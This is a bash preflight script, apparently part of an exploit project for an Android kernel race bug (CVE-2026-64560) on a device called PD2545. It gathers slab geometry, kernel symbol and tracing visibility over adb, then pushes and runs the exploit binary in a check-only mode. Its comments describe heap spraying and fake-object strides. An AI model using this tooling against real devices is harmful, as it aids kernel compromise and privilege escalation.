#!/usr/bin/env bash
# PD2545D CVE-2026-64560 read-only preflight.
#
# Safe by construction: the payload is invoked with --preflight only. It never
# starts the race and never writes kernel memory. The script also collects the
# identity/visibility facts that decide whether --run can ever be attempted.
#
# Usage: ./tools/pd2545_preflight.sh [adb-serial]
#        ADB=/path/to/adb ./tools/pd2545_preflight.sh
set -uo pipefail

# Git Bash/MSYS rewrites /data/... into C:/Program Files/Git/...; disable.
export MSYS2_ARG_CONV_EXCL='/data'

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ADB="${ADB:-D:/D-code/tools/android/platform-tools/adb.exe}"
SERIAL="${1:-}"
BIN="$HERE/pd2545-64560/build/cve-2026-64560-pd2545"
REMOTE="/data/local/tmp/cve-2026-64560-pd2545"
LOG_DIR="$HERE/logs"
LOG="$LOG_DIR/pd2545-preflight-$(date +%Y%m%d-%H%M%S).log"

[ -f "$BIN" ] || { echo "missing $BIN (run pd2545-64560/build.sh)" >&2; exit 2; }
[ -x "$ADB" ] || ADB="$ADB.exe"
[ -x "$ADB" ] || { echo "missing adb: $ADB" >&2; exit 2; }
mkdir -p "$LOG_DIR"

adb_() {
    if [ -n "$SERIAL" ]; then
        "$ADB" -s "$SERIAL" "$@"
    else
        "$ADB" "$@"
    fi
}

sh_() {
    adb_ shell "$@" 2>&1
}

{
    echo "=== PD2545 preflight $(date -Is) ==="
    echo "--- adb devices ---"
    "$ADB" devices -l
    echo "--- identity ---"
    sh_ 'getprop ro.build.fingerprint; getprop ro.product.device; getprop ro.build.version.incremental; getprop ro.boot.verifiedbootstate'
    sh_ 'uname -r; uname -v; getconf PAGE_SIZE'
    echo "--- selinux / limits / slab ---"
    sh_ 'cat /sys/fs/selinux/enforce'
    sh_ 'grep -E "Max pending signals|Max processes" /proc/self/limits'
    sh_ 'grep posix_timers /proc/slabinfo'
    echo "--- posix_timers slab geometry (stage0 fake stride check) ---"
    sh_ 'for f in object_size objs_per_slab order slab_size cpu_partial aliases; do printf "%s=" "$f"; cat /sys/kernel/slab/posix_timers/$f 2>&1; done'
    echo "--- post-crash evidence if the device rebooted ---"
    sh_ 'echo BOOT_ID=$(cat /proc/sys/kernel/random/boot_id); echo UPTIME=$(cut -d. -f1 /proc/uptime); getprop ro.boot.bootreason; getprop sys.boot.reason; ls -l /sys/fs/pstore 2>&1 | head -5'
    echo "--- uhid ---"
    sh_ 'ls -l /dev/uhid; grep -i uhid /proc/misc'
    echo "--- visibility matrix (expected denials are reported, not fatal) ---"
    echo "[tracing addrs]"; sh_ 'ls -ld /sys/kernel/tracing; head -3 /sys/kernel/tracing/available_filter_functions_addrs'
    echo "[tracing fix symbols]"; sh_ 'grep -E "timer_lock_sighand|ep_get_upwards_depth_proc|ep_free" /sys/kernel/tracing/available_filter_functions | head -10'
    echo "[kallsyms]"; sh_ 'head -1 /proc/kallsyms'
    echo "[btf]"; sh_ 'ls -l /sys/kernel/btf/vmlinux'
    echo "[iomem]"; sh_ 'head -8 /proc/iomem'
    echo "--- push + read-only preflight ---"
    adb_ push "$BIN" "$REMOTE"
    sh_ "chmod 755 $REMOTE"
    sh_ "$REMOTE --preflight"
    echo "--- preflight verdict ---"
    if sh_ "$REMOTE --preflight" | grep -q 'TARGET_PROFILE_GATE_PASS profile=pd2545-dd6fd5c98918'; then
        echo "PREFLIGHT_RESULT=PASS"
    else
        echo "PREFLIGHT_RESULT=FAIL (see the payload output above)"
    fi
    echo "=== done ==="
} 2>&1 | tee "$LOG"

echo
echo "log: $LOG"
echo
echo "NEXT: after the 2026-10-17 22:25 run the device dropped off USB"
echo "immediately after the attempt-1 spray (timer_goal=55962). Do not"
echo "rerun --dump-kallsyms until this preflight confirms the device is"
echo "back, reports the posix_timers object_size/objs_per_slab, and shows"
echo "whether it rebooted (boot_id/uptime/bootreason/pstore). If the slab"
echo "geometry is not 0x100 x 32 objects per order-1 page, rebuild the fake"
echo "node stride before any further race attempt."
